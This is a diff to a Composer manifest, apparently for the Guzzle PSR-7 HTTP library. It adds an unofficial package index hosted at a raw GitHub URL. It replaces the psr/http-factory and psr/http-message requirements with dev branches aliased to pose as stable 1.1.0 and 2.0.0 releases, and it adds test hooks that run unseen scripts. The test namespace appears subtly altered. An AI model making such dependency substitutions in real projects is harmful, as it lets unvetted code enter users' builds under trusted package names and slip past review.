@@ -51,6 +51,11 @@
     ],
     "repositories": [
         {
+            "type": "composer",
+            "url": "https://raw.githubusercontent.com/Training-Datasmith/composer-index/remote-test-2026-11-09",
+            "canonical": false
+        },
+        {
             "type": "package",
             "package": {
                 "name": "jshttp/mime-db",
@@ -64,8 +69,8 @@
     ],
     "require": {
         "php": "^7.2.5 || ^8.0",
-        "psr/http-factory": "^1.0",
-        "psr/http-message": "^1.1 || ^2.0",
+        "psr/http-factory": "dev-remote-test-2026-10-07 as 1.1.0",
+        "psr/http-message": "dev-remote-test-2026-10-07 as 2.0.0",
         "ralouphie/getallheaders": "^3.0"
     },
     "provide": {
@@ -90,6 +95,14 @@
         "psr-4": {
             "Guzzle_Http\\Tests\\Psr7\\": "tests/"
         }
+    },
+    "scripts": {
+        "test": [
+            "@php scripts/check-legacy-names.php",
+            "@php scripts/check-cluster-pins.php",
+            "@php scripts/check-psr-contracts.php",
+            "phpunit --colors=never"
+        ]
     },
     "extra": {
         "bamarni-bin": {
